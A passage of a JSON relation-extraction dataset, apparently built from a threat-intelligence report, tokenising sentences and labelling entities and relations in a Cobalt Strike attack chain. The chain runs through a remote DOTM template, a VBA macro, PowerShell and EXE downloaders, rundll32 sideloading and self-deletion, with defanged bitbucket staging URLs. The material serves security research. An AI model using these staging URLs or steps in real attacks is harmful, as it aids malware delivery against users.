"8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [93, 93], "name": "document", "pos": [11, 12], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [95, 95], "name": "Windows", "pos": [13, 14], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [102, 102], "name": "DOTM template", "pos": [20, 22], "index": "11_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [108, 108], "name": "https [ : // ] bitbucket.org/clouchfair/oneproject/downloads/ww.dotm", "pos": [26, 32], "index": "12_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [132, 132], "name": "DOTM template", "pos": [4, 6], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [136, 136], "name": "VBA macro", "pos": [8, 10], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [156, 156], "name": "script", "pos": [28, 29], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [159, 159], "name": "it", "pos": [31, 32], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [170, 170], "name": "downloader", "pos": [5, 6], "index": "17_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [176, 176], "name": "executable", "pos": [11, 12], "index": "18_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [179, 179], "name": "it", "pos": [14, 15], "index": "19_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [182, 182], "name": "process", "pos": [17, 18], "index": "20_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [193, 193], "name": "downloader", "pos": [4, 5], "index": "21_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [209, 209], "name": "It", "pos": [0, 1], "index": "22_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [212, 212], "name": "PowerShell", "pos": [3, 4], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [220, 220], "name": "payload DLL", "pos": [11, 13], "index": "24_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [226, 226], "name": "https [ : // ] bitbucket.org/clouchfair/oneproject/downloads/strymon.png", "pos": [17, 23], "index": "25_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [248, 248], "name": "DLL", "pos": [39, 40], "index": "26_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [250, 250], "name": "rundll32.exe", "pos": [41, 42], "index": "27_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 1, "t": 3}, {"r": "EX", "evidence": [0], "t": 2, "h": 3}, {"r": "FR", "evidence": [2], "h": 4, "t": 5}, {"r": "FR", "evidence": [2], "h": 5, "t": 6}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "EX", "evidence": [2], "h": 6, "t": 7}, {"r": "FR", "evidence": [3], "h": 8, "t": 10}, {"r": "EX", "evidence": [3], "t": 9, "h": 10}, {"r": "WR", "evidence": [3], "h": 10, "t": 11}, {"r": "ST", "evidence": [3], "h": 10, "t": 12}, {"r": "RF", "evidence": [3], "h": 10, "t": 12}, {"r": "FR", "evidence": [3, 4], "h": 10, "t": 14}, {"r": "CO", "evidence": [3, 4], "h": 11, "t": 13}, {"r": "UK", "evidence": [4], "t": 13, "h": 14}, {"r": "FR", "evidence": [4, 5], "h": 14, "t": 17}, {"r": "CO", "evidence": [4], "h": 15, "t": 16}, {"r": "EX", "evidence": [4, 5], "t": 15, "h": 17}, {"r": "WR", "evidence": [5], "h": 17, "t": 18}, {"r": "FR", "evidence": [5], "h": 17, "t": 20}, {"r": "EX", "evidence": [5], "t": 19, "h": 20}, {"r": "CO", "evidence": [5], "h": 18, "t": 19}, {"r": "CO", "evidence": [5, 6], "h": 17, "t": 21}, {"r": "CO", "evidence": [5, 6, 7], "h": 17, "t": 22}, {"r": "FR", "evidence": [7], "h": 22, "t": 23}, {"r": "WR", "evidence": [7], "h": 23, "t": 24}, {"r": "ST", "evidence": [7], "h": 23, "t": 25}, {"r": "RF", "evidence": [7], "h": 23, "t": 25}, {"r": "FR", "evidence": [7], "h": 23, "t": 27}, {"r": "EX", "evidence": [7], "t": 26, "h": 27}, {"r": "CO", "evidence": [7], "h": 24, "t": 26}]}, {"title": "063-23", "sents": [["Upon", "running", "the", "payload", ",", "the", "script", "will", "hide", "the", "payload", "file", "to", "establish", "persistence", "by", "setting", "the", "``", "hidden", "''", "file", "system", "attribute", "of", "the", "payload", "file", "."], ["We", "spotted", "that", ",", "in", "the", "attack", "chain", ",", "the", "actor", "employed", "a", "64-bit", "Windows", "executable", "downloader", "which", "executes", "the", "PowerShell", "commands", "responsible", "for", "downloading", "and", "running", "the", "Cobalt", "Strike", "payload", "."], ["Stage", "1", "maldoc", ":", "DOTM", "templateWhen", "a", "victim", "opens", "the", "malicious", "document", ",", "Windows", "attempts", "to", "download", "a", "malicious", "remote", "DOTM", "template", "through", "the", "URL", "``", "https", "[", ":", "//", "]", "bitbucket.org/clouchfair/oneproject/downloads/ww.dotm", ",", "''", "which", "was", "embedded", "in", "its", "relationship", "component", "of", "the", "file", "settings.xml.rels", "."], ["Stage", "2", "VB", "scriptThe", "DOTM", "template", "contains", "a", "VBA", "macro", "that", "executes", "a", "function", "to", "decode", "an", "encoded", "data", "block", "of", "the", "macro", "to", "generate", "the", "PowerShell", "downloader", "script", "and", "execute", "it", "with", "the", "shell", "function", "."], ["Stage", "3", "PowerShell", "downloaderThe", "PowerShell", "downloader", "command", "downloads", "a", "64-bit", "Windows", "executable", "and", "runs", "it", "as", "a", "process", "in", "the", "victim", "'s", "machine", "."], ["Stage", "4", "downloader", "executableThe", "downloader", "is", "a", "64-bit", "executable", "that", "runs", "as", "a", "process", "in", "the", "victim", "'s", "environment", "."], ["It", "executes", "the", "PowerShell", "command", ",", "which", "downloads", "the", "Cobalt", "Strike", "payload", "DLL", "through", "the", "URL", "``", "https", "[", ":", "//", "]", "bitbucket.org/clouchfair/oneproject/downloads/strymon.png", "''", "to", "the", "userprofile", "local", "application", "temporary", "directory", "with", "a", "spoofed", "extension", ".png", "and", "sideloads", "the", "DLL", "using", "rundll32.exe", "."], ["Stage", "4", "downloader", "EXE", "."]], "vertexSet": [[{"type": "MP", "sent_id": 1, "global_pos": [39, 39], "name": "actor", "pos": [10, 11], "index": "0_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [45, 45], "name": "downloader", "pos": [16, 17], "index": "1_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [49, 49], "name": "PowerShell", "pos": [20, 21], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [59, 59], "name": "payload", "pos": [30, 31], "index": "3_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [68, 68], "name": "victim", "pos": [7, 8], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [72, 72], "name": "document", "pos": [11, 12], "index": "5_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [74, 74], "name": "Windows", "pos": [13, 14], "index": "6_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [81, 81], "name": "DOTM template", "pos": [20, 22], "index": "7_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [87, 87], "name": "https [ : // ] bitbucket.org/clouchfair/oneproject/downloads/ww.dotm", "pos": [26, 32], "index": "8_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [111, 111], "name": "DOTM template", "pos": [4, 6], "index": "9_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [115, 115], "name": "VBA macro", "pos": [8, 10], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [135, 135], "name": "script", "pos": [28, 29], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [138, 138], "name": "it", "pos": [31, 32], "index": "12_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [149, 149], "name": "downloader", "pos": [5, 6], "index": "13_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [155, 155], "name": "executable", "pos": [11, 12], "index": "14_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [158, 158], "name": "it", "pos": [14, 15], "index": "15_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [161, 161], "name": "process", "pos": [17, 18], "index": "16_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [172, 172], "name": "downloader", "pos": [4, 5], "index": "17_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [188, 188], "name": "It", "pos": [0, 1], "index": "18_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [191, 191], "name": "PowerShell", "pos": [3, 4], "index": "19_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [199, 199], "name": "payload DLL", "pos": [11, 13], "index": "20_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [205, 205], "name": "https [ : // ] bitbucket.org/clouchfair/oneproject/downloads/strymon.png", "pos": [17, 23], "index": "21_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [227, 227], "name": "DLL", "pos": [39, 40], "index": "22_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [229, 229], "name": "rundll32.exe", "pos": [41, 42], "index": "23_0"}]], "labels": [{"r": "FR", "evidence": [1], "h": 0, "t": 1}, {"r": "FR", "evidence": [1], "h": 1, "t": 2}, {"r": "WR", "evidence": [1], "h": 2, "t": 3}, {"r": "EX", "evidence": [1], "h": 2, "t": 3}, {"r": "FR", "evidence": [2], "h": 4, "t": 6}, {"r": "EX", "evidence": [2], "t": 5, "h": 6}, {"r": "WR", "evidence": [2], "h": 6, "t": 7}, {"r": "ST", "evidence": [2], "h": 6, "t": 8}, {"r": "RF", "evidence": [2], "h": 6, "t": 8}, {"r": "FR", "evidence": [2, 3], "h": 6, "t": 10}, {"r": "CO", "evidence": [2, 3], "h": 7, "t": 9}, {"r": "UK", "evidence": [3], "t": 9, "h": 10}, {"r": "FR", "evidence": [3, 4], "h": 10, "t": 13}, {"r": "CO", "evidence": [3], "h": 11, "t": 12}, {"r": "EX", "evidence": [3, 4], "t": 11, "h": 13}, {"r": "WR", "evidence": [4], "h": 13, "t": 14}, {"r": "FR", "evidence": [4], "h": 13, "t": 16}, {"r": "EX", "evidence": [4], "t": 15, "h": 16}, {"r": "CO", "evidence": [4], "h": 14, "t": 15}, {"r": "CO", "evidence": [4, 5], "h": 13, "t": 17}, {"r": "CO", "evidence": [4, 5, 6], "h": 13, "t": 18}, {"r": "FR", "evidence": [6], "h": 18, "t": 19}, {"r": "WR", "evidence": [6], "h": 19, "t": 20}, {"r": "ST", "evidence": [6], "h": 19, "t": 21}, {"r": "RF", "evidence": [6], "h": 19, "t": 21}, {"r": "FR", "evidence": [6], "h": 19, "t": 23}, {"r": "EX", "evidence": [6], "t": 22, "h": 23}, {"r": "CO", "evidence": [6], "h": 20, "t": 22}]}, {"title": "063-24", "sents": [["We", "spotted", "that", ",", "in", "the", "attack", "chain", ",", "the", "actor", "employed", "a", "64-bit", "Windows", "executable", "downloader", "which", "executes", "the", "PowerShell", "commands", "responsible", "for", "downloading", "and", "running", "the", "Cobalt", "Strike", "payload", "."], ["Stage", "1", "maldoc", ":", "DOTM", "templateWhen", "a", "victim", "opens", "the", "malicious", "document", ",", "Windows", "attempts", "to", "download", "a", "malicious", "remote", "DOTM", "template", "through", "the", "URL", "``", "https", "[", ":", "//", "]", "bitbucket.org/clouchfair/oneproject/downloads/ww.dotm", ",", "''", "which", "was", "embedded", "in", "its", "relationship", "component", "of", "the", "file", "settings.xml.rels", "."], ["Stage", "2", "VB", "scriptThe", "DOTM", "template", "contains", "a", "VBA", "macro", "that", "executes", "a", "function", "to", "decode", "an", "encoded", "data", "block", "of", "the", "macro", "to", "generate", "the", "PowerShell", "downloader", "script", "and", "execute", "it", "with", "the", "shell", "function", "."], ["Stage", "3", "PowerShell", "downloaderThe", "PowerShell", "downloader", "command", "downloads", "a", "64-bit", "Windows", "executable", "and", "runs", "it", "as", "a", "process", "in", "the", "victim", "'s", "machine", "."], ["Stage", "4", "downloader", "executableThe", "downloader", "is", "a", "64-bit", "executable", "that", "runs", "as", "a", "process", "in", "the", "victim", "'s", "environment", "."], ["It", "executes", "the", "PowerShell", "command", ",", "which", "downloads", "the", "Cobalt", "Strike", "payload", "DLL", "through", "the", "URL", "``", "https", "[", ":", "//", "]", "bitbucket.org/clouchfair/oneproject/downloads/strymon.png", "''", "to", "the", "userprofile", "local", "application", "temporary", "directory", "with", "a", "spoofed", "extension", ".png", "and", "sideloads", "the", "DLL", "using", "rundll32.exe", "."], ["Stage", "4", "downloader", "EXE", "."], ["The", "downloader", "also", "executes", "the", "ping", "command", "to", "the", "IP", "address", "1.1.1.1"]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [10, 10], "name": "actor", "pos": [10, 11], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [16, 16], "name": "downloader", "pos": [16, 17], "index": "1_0"}], [{"type": "TP", "sent_id": 0, "global_pos": [20, 20], "name": "PowerShell", "pos": [20, 21], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [30, 30], "name": "payload", "pos": [30, 31], "index": "3_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [39, 39], "name": "victim", "pos": [7, 8], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [43, 43], "name": "document", "pos": [11, 12], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [45, 45], "name": "Windows", "pos": [13, 14], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [52, 52], "name": "DOTM template", "pos": [20, 22], "index": "7_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [58, 58], "name": "https [ : // ] bitbucket.org/clouchfair/oneproject/downloads/ww.dotm", "pos": [26, 32], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [82, 82], "name": "DOTM template", "pos": [4, 6], "index": "9_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [86, 86], "name": "VBA macro", "pos": [8, 10], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [106, 106], "name": "script", "pos": [28, 29], "index": "11_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [109, 109], "name": "it", "pos": [31, 32], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [120, 120], "name": "downloader", "pos": [5, 6], "index": "13_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [126, 126], "name": "executable", "pos": [11, 12], "index": "14_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [129, 129], "name": "it", "pos": [14, 15], "index": "15_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [132, 132], "name": "process", "pos": [17, 18], "index": "16_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [143, 143], "name": "downloader", "pos": [4, 5], "index": "17_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [159, 159], "name": "It", "pos": [0, 1], "index": "18_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [162, 162], "name": "PowerShell", "pos": [3, 4], "index": "19_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [170, 170], "name": "payload DLL", "pos": [11, 13], "index": "20_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [176, 176], "name": "https [ : // ] bitbucket.org/clouchfair/oneproject/downloads/strymon.png", "pos": [17, 23], "index": "21_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [198, 198], "name": "DLL", "pos": [39, 40], "index": "22_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [200, 200], "name": "rundll32.exe", "pos": [41, 42], "index": "23_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [208, 208], "name": "downloader", "pos": [1, 2], "index": "24_0"}], [{"type": "TP", "sent_id": 7, "global_pos": [212, 212], "name": "ping", "pos": [5, 6], "index": "25_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [216, 216], "name": "IP address", "pos": [9, 11], "index": "26_0"}], [{"type": "SO", "sent_id": 7, "global_pos": [218, 218], "name": "1.1.1.1", "pos": [11, 12], "index": "27_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 1, "t": 2}, {"r": "WR", "evidence": [0], "h": 2, "t": 3}, {"r": "EX", "evidence": [0], "h": 2, "t": 3}, {"r": "FR", "evidence": [1], "h": 4, "t": 6}, {"r": "EX", "evidence": [1], "t": 5, "h": 6}, {"r": "WR", "evidence": [1], "h": 6, "t": 7}, {"r": "ST", "evidence": [1], "h": 6, "t": 8}, {"r": "RF", "evidence": [1], "h": 6, "t": 8}, {"r": "FR", "evidence": [1, 2], "h": 6, "t": 10}, {"r": "CO", "evidence": [1, 2], "h": 7, "t": 9}, {"r": "UK", "evidence": [2], "t": 9, "h": 10}, {"r": "FR", "evidence": [2, 3], "h": 10, "t": 13}, {"r": "CO", "evidence": [2], "h": 11, "t": 12}, {"r": "EX", "evidence": [2, 3], "t": 11, "h": 13}, {"r": "WR", "evidence": [3], "h": 13, "t": 14}, {"r": "FR", "evidence": [3], "h": 13, "t": 16}, {"r": "EX", "evidence": [3], "t": 15, "h": 16}, {"r": "CO", "evidence": [3], "h": 14, "t": 15}, {"r": "CO", "evidence": [3, 4], "h": 13, "t": 17}, {"r": "CO", "evidence": [3, 4, 5], "h": 13, "t": 18}, {"r": "CO", "evidence": [3, 4, 5, 6, 7], "h": 13, "t": 24}, {"r": "FR", "evidence": [5], "h": 18, "t": 19}, {"r": "WR", "evidence": [5], "h": 19, "t": 20}, {"r": "ST", "evidence": [5], "h": 19, "t": 21}, {"r": "RF", "evidence": [5], "h": 19, "t": 21}, {"r": "FR", "evidence": [5], "h": 19, "t": 23}, {"r": "EX", "evidence": [5], "t": 22, "h": 23}, {"r": "CO", "evidence": [5], "h": 20, "t": 22}, {"r": "FR", "evidence": [7], "h": 24, "t": 25}, {"r": "ST", "evidence": [7], "h": 25, "t": 26}, {"r": "RF", "evidence": [7], "h": 25, "t": 26}, {"r": "CO", "evidence": [7], "h": 26, "t": 27}]}, {"title": "063-25", "sents": [["Stage", "1", "maldoc", ":", "DOTM", "templateWhen", "a", "victim", "opens", "the", "malicious", "document", ",", "Windows", "attempts", "to", "download", "a", "malicious", "remote", "DOTM", "template", "through", "the", "URL", "``", "https", "[", ":", "//", "]", "bitbucket.org/clouchfair/oneproject/downloads/ww.dotm", ",", "''", "which", "was", "embedded", "in", "its", "relationship", "component", "of", "the", "file", "settings.xml.rels", "."], ["Stage", "2", "VB", "scriptThe", "DOTM", "template", "contains", "a", "VBA", "macro", "that", "executes", "a", "function", "to", "decode", "an", "encoded", "data", "block", "of", "the", "macro", "to", "generate", "the", "PowerShell", "downloader", "script", "and", "execute", "it", "with", "the", "shell", "function", "."], ["Stage", "3", "PowerShell", "downloaderThe", "PowerShell", "downloader", "command", "downloads", "a", "64-bit", "Windows", "executable", "and", "runs", "it", "as", "a", "process", "in", "the", "victim", "'s", "machine", "."], ["Stage", "4", "downloader", "executableThe", "downloader", "is", "a", "64-bit", "executable", "that", "runs", "as", "a", "process", "in", "the", "victim", "'s", "environment", "."], ["It", "executes", "the", "PowerShell", "command", ",", "which", "downloads", "the", "Cobalt", "Strike", "payload", "DLL", "through", "the", "URL", "``", "https", "[", ":", "//", "]", "bitbucket.org/clouchfair/oneproject/downloads/strymon.png", "''", "to", "the", "userprofile", "local", "application", "temporary", "directory", "with", "a", "spoofed", "extension", ".png", "and", "sideloads", "the", "DLL", "using", "rundll32.exe", "."], ["Stage", "4", "downloader", "EXE", "."], ["The", "downloader", "also", "executes", "the", "ping", "command", "to", "the", "IP", "address", "1.1.1.1"], ["1", "and", "executes", "the", "delete", "command", "to", "delete", "itself", "."]], "vertexSet": [[{"type": "TP", "sent_id": 0, "global_pos": [7, 7], "name": "victim", "pos": [7, 8], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [11, 11], "name": "document", "pos": [11, 12], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [13, 13], "name": "Windows", "pos": [13, 14], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [20, 20], "name": "DOTM template", "pos": [20, 22], "index": "3_0"}], [{"type": "SO", "sent_id": 0, "global_pos": [26, 26], "name": "https [ : // ] bitbucket.org/clouchfair/oneproject/downloads/ww.dotm", "pos": [26, 32], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [50, 50], "name": "DOTM template", "pos": [4, 6], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [54, 54], "name": "VBA macro", "pos": [8, 10], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [74, 74], "name": "script", "pos": [28, 29], "index": "7_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [77, 77], "name": "it", "pos": [31, 32], "index": "8_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [88, 88], "name": "downloader", "pos": [5, 6], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [94, 94], "name": "executable", "pos": [11, 12], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [97, 97], "name": "it", "pos": [14, 15], "index": "11_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [100, 100], "name": "process", "pos": [17, 18], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [111, 111], "name": "downloader", "pos": [4, 5], "index": "13_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [127, 127], "name": "It", "pos": [0, 1], "index": "14_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [130, 130], "name": "PowerShell", "pos": [3, 4], "index": "15_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [138, 138], "name": "payload DLL", "pos": [11, 13], "index": "16_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [144, 144], "name": "https [ : // ] bitbucket.org/clouchfair/oneproject/downloads/strymon.png", "pos": [17, 23], "index": "17_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [166, 166], "name": "DLL", "pos": [39, 40], "index": "18_0"}], [{"type": "TP", "sent_id": 4, "global_pos": [168, 168], "name": "rundll32.exe", "pos": [41, 42], "index": "19_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [176, 176], "name": "downloader", "pos": [1, 2], "index": "20_0"}], [{"type": "TP", "sent_id": 6, "global_pos": [180, 180], "name": "ping", "pos": [5, 6], "index": "21_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [184, 184], "name": "IP address", "pos": [9, 11], "index": "22_0"}], [{"type": "SO", "sent_id": 6, "global_pos": [186, 186], "name": "1.1.1.1", "pos": [11, 12], "index": "23_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [195, 195], "name": "itself", "pos": [8, 9], "index": "24_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 2}, {"r": "EX", "evidence": [0], "t": 1, "h": 2}, {"r": "WR", "evidence": [0], "h": 2, "t": 3}, {"r": "ST", "evidence": [0], "h": 2, "t": 4}, {"r": "RF", "evidence": [0], "h": 2, "t": 4}, {"r": "FR", "evidence": [0, 1], "h": 2, "t": 6}, {"r": "CO", "evidence": [0, 1], "h": 3, "t": 5}, {"r": "UK", "evidence": [1], "t": 5, "h": 6}, {"r": "FR", "evidence": [1, 2], "h": 6, "t": 9}, {"r": "CO", "evidence": [1], "h": 7, "t": 8}, {"r": "EX", "evidence": [1, 2], "t": 7, "h": 9}, {"r": "WR", "evidence": [2], "h": 9, "t": 10}, {"r": "FR", "evidence": [2], "h": 9, "t": 12}, {"r": "EX", "evidence": [2], "t": 11, "h": 12}, {"r": "CO", "evidence": [2], "h": 10, "t": 11}, {"r": "CO", "evidence": [2, 3], "h": 9, "t": 13}, {"r": "CO", "evidence": [2, 3, 4], "h": 9, "t": 14}, {"r": "CO", "evidence": [2, 3, 4, 5, 6], "h": 9, "t": 20}, {"r": "FR", "evidence": [4], "h": 14, "t": 15}, {"r": "WR", "evidence": [4], "h": 15, "t": 16}, {"r": "ST", "evidence": [4], "h": 15, "t": 17}, {"r": "RF", "evidence": [4], "h": 15, "t": 17}, {"r": "FR", "evidence": [4], "h": 15, "t": 19}, {"r": "EX", "evidence": [4], "t": 18, "h": 19}, {"r": "CO", "evidence": [4], "h": 16, "t": 18}, {"r": "CO", "evidence": [4, 5, 6, 7], "h": 16, "t": 24}, {"r": "FR", "evidence": [6], "h": 20, "t": 21}, {"r": "ST", "evidence": [6], "h": 21, "t": 22}, {"r": "RF", "evidence": [6], "h": 21, "t": 22}, {"r": "UK", "evidence": [6, 7], "h": 20, "t": 24}, {"r": "CO", "evidence": [6], "h": 22, "t": 23}]}, {"title": "063-26", "sents": [["Stage", "2", "VB", "scriptThe", "DOTM", "template", "contains", "a", "VBA", "macro", "that", "executes", "a", "function", "to", "decode", "an", "encoded", "data", "block", "of", "the", "macro", "to", "generate", "the", "PowerShell", "downloader", "script", "and", "execute", "it", "with", "the", "shell", "function", "."], ["Stage", "3", "PowerShell", "downloaderThe", "PowerShell", "downloader", "command", "downloads", "a", "64-bit", "Windows", "executable", "and", "runs", "it", "as", "a", "process", "in", "the", "victim", "'s", "machine", "."], ["Stage", "4", "downloader", "executableThe", "downloader", "is", "a", "64-bit", "executable", "that", "runs", "as", "a", "process", "in", "the", "victim", "'s", "environment", "."], ["It", "executes", "the", "PowerShell", "command", ",", "which", "downloads", "the", "Cobalt", "Strike", "payload", "DLL", "through", "the", "URL", "``", "https", "[", ":", "//", "]", "bitbucket.org/clouchfair/oneproject/downloads/strymon.png", "''", "to", "the", "userprofile", "local", "application", "temporary", "directory", "with", "a", "spoofed", "extension", ".png", "and", "sideloads", "the", "DLL", "using", "rundll32.exe", "."], ["Stage", "4", "downloader", "EXE", "."], ["The", "downloader", "also", "executes", "the", "ping", "command", "to", "the", "IP", "address", "1.1.1.1"], ["1", "and", "executes", "the", "delete", "command", "to", "delete", "itself", "."], ["The", "usage", "of", "ping", "command", "is", "to", "instill", "a", "delay", "before", "deleting", "the", "downloader", "."]], "vertexSet": [[{"type": "MF", "sent_id": 0, "global_pos": [4, 4], "name": "DOTM template", "pos": [4, 6], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [8, 8], "name": "VBA macro", "pos": [8, 10], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [28, 28], "name": "script", "pos": [28, 29], "index": "2_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [31, 31], "name": "it", "pos": [31, 32], "index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [42, 42], "name": "downloader", "pos": [5, 6], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [48, 48], "name": "executable", "pos": [11, 12], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [51, 51], "name": "it", "pos": [14, 15], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [54, 54], "name": "process", "pos": [17, 18], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [65, 65], "name": "downloader", "pos": [4, 5], "index": "8_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [81, 81], "name": "It", "pos": [0, 1], "index": "9_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [84, 84], "name": "PowerShell", "pos": [3, 4], "index": "10_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [92, 92], "name": "payload DLL", "pos": [11, 13], "index": "11_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [98, 98], "name": "https [ : // ] bitbucket.org/clouchfair/oneproject/downloads/strymon.png", "pos": [17, 23], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [120, 120], "name": "DLL", "pos": [39, 40], "index": "13_0"}], [{"type": "TP", "sent_id": 3, "global_pos": [122, 122], "name": "rundll32.exe", "pos": [41, 42], "index": "14_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [130, 130], "name": "downloader", "pos": [1, 2], "index": "15_0"}], [{"type": "TP", "sent_id": 5, "global_pos": [134, 134], "name": "ping", "pos": [5, 6], "index": "16_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [138, 138], "name": "IP address", "pos": [9, 11], "index": "17_0"}], [{"type": "SO", "sent_id": 5, "global_pos": [140, 140], "name": "1.1.1.1", "pos": [11, 12], "index": "18_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [149, 149], "name": "itself", "pos": [8, 9], "index": "19_0"}]], "labels": [{"r": "UK", "evidence": [0], "t": 0, "h": 1}, {"r": "FR", "evidence": [0, 1], "h": 1, "t": 4}, {"r": "CO", "evidence": [0], "h": 2, "t": 3}, {"r": "EX", "evidence": [0, 1], "t": 2, "h": 4}, {"r": "WR", "evidence": [1], "h": 4, "t": 5}, {"r": "FR", "evidence": [1], "h": 4, "t": 7}, {"r": "EX", "evidence": [1], "t": 6, "h": 7}, {"r": "CO", "evidence": [1], "h": 5, "t": 6}, {"r": "CO", "evidence": [1, 2], "h": 4, "t": 8}, {"r": "CO", "evidence": [1, 2, 3], "h": 4, "t": 9}, {"r": "CO", "evidence": [1, 2, 3, 4, 5], "h": 4, "t": 15}, {"r": "FR", "evidence": [3], "h": 9, "t": 10}, {"r": "WR", "evidence": [3], "h": 10, "t": 11}, {"r": "ST", "evidence": [3], "h": 10, "t": 12}, {"r": "RF", "evidence": [3], "h": 10, "t": 12}, {"r": "FR", "evidence": [3], "h": 10, "t": 14}, {"r": "EX", "evidence": [3], "t": 13, "h": 14}, {"r": "CO", "evidence": [3], "h": 11, "t": 13}, {"r": "CO", "evidence": [3, 4, 5, 6], "h": 11, "t": 19}, {"r": "FR", "evidence": [5], "h": 15, "t": 16}, {"r": "ST", "evidence": [5], "h": 16, "t": 17}, {"r": "RF", "evidence": [5], "h": 16, "t": 17}, {"r": "UK", "evidence": [5, 6], "h": 15, "t": 19}, {"r": "CO", "evidence": [5], "h": 17, "t": 18}]}, {"title": "063-27", "sents": [["Stage", "3", "PowerShell", "downloaderThe", "PowerShell", 